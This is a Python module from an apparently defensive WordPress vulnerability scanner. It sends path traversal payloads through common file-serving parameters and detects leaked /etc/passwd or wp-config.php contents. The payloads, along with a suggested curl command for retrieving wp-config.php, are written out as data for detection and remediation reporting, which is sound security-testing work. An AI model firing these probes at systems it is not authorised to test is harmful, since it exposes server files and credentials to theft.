"""Path traversal probes on common WP/plugin file-serving endpoints.

Read-only payloads — we look at common parameters used by plugins to serve
files (download=, file=, path=, doc=, etc.) and try classic ../../etc/passwd
patterns. Detection by content signatures (e.g. 'root:x:0:0').
"""
from __future__ import annotations

from ..http import Client
from ..models import Finding
from ..prove import build_replay_curl

PASSWD_SIG = "root:x:0:0:"
WIN_INI_SIG = "[fonts]"  # very weak — Windows hosts rarely serve win.ini

# (path, param, payload_list, description)
PROBES = (
    ("/wp-admin/admin-ajax.php", "action", ["nonexistent"], "admin-ajax baseline (skip)"),
    ("/", "file", ["../../../../../../etc/passwd", "....//....//....//etc/passwd", "../../../../wp-config.php"], "?file= parameter"),
    ("/", "doc", ["../../../../../../etc/passwd"], "?doc= parameter"),
    ("/", "path", ["../../../../../../etc/passwd"], "?path= parameter"),
    ("/", "download", ["../../../../../../etc/passwd"], "?download= parameter"),
    ("/", "page", ["../../../../../../etc/passwd"], "?page= parameter"),
)


async def check(client: Client, ctx: dict) -> list[Finding]:
    findings: list[Finding] = []
    step = ctx.get("step") or (lambda _s: None)

    for path, param, payloads, desc in PROBES:
        if "skip" in desc:
            continue
        for payload in payloads:
            step(f"probing {desc} with {payload[:40]}...")
            r = await client.get(path, params={param: payload})
            if r is None or not r.text:
                continue
            body = r.text[:8000]
            if PASSWD_SIG in body:
                url = client.url(path)
                replay = build_replay_curl("GET", url, params={param: payload})
                findings.append(
                    Finding(
                        severity="critical",
                        title=f"Path traversal confirmed via {desc}",
                        evidence=(
                            f"GET {path} with {param}={payload}\n"
                            f"  -> HTTP {r.status_code}\n"
                            "  Response body contains /etc/passwd content (root:x:0:0)."
                        ),
                        remediation=(
                            "Locate the plugin handling this parameter and patch immediately — validate file paths "
                            "against realpath() and a known-safe base directory, never concatenate user input into "
                            "file paths. Take the site offline until fixed; assume any file in the WP install may have been read."
                        ),
                        url=url,
                        extra={
                            "provable": True,
                            "prover": "path_traversal",
                            "param": param,
                            "payload_template": payload,
                            "baseline_path": path,
                            "replay": replay,
                            "next_steps": [
                                f'curl -i "{url}?{param}=../../../../../../wp-config.php"',
                                "# If wp-config is readable, rotate every secret in it and review logs",
                            ],
                        },
                    )
                )
                return findings  # Don't pile on once we've confirmed
            if "<?php" in body and "wp-config" in payload:
                url = client.url(path)
                replay = build_replay_curl("GET", url, params={param: payload})
                findings.append(
                    Finding(
                        severity="critical",
                        title=f"Path traversal: wp-config.php contents leaked via {desc}",
                        evidence=(
                            f"GET {path} with {param}={payload}\n"
                            "  Response contains PHP source — wp-config.php was likely served as plaintext."
                        ),
                        remediation=(
                            "Patch the plugin immediately and rotate DB credentials, salts, and any API keys in wp-config.php. "
                            "Audit access logs for prior reads of this URL."
                        ),
                        url=url,
                        extra={
                            "provable": True,
                            "prover": "path_traversal",
                            "param": param,
                            "payload_template": payload,
                            "baseline_path": path,
                            "replay": replay,
                            "next_steps": [
                                "# Assume wp-config secrets are leaked — rotate DB password, AUTH_KEYs, and any API keys",
                            ],
                        },
                    )
                )
                return findings

    if not findings:
        findings.append(
            Finding(
                severity="info",
                title="No path-traversal indicators on tested parameters",
                evidence=f"Probed {sum(len(p[2]) for p in PROBES if 'skip' not in p[3])} payloads across {len([p for p in PROBES if 'skip' not in p[3]])} parameter patterns.",
                remediation="No action needed for the tested endpoints.",
                url=ctx["target"],
            )
        )
    return findings
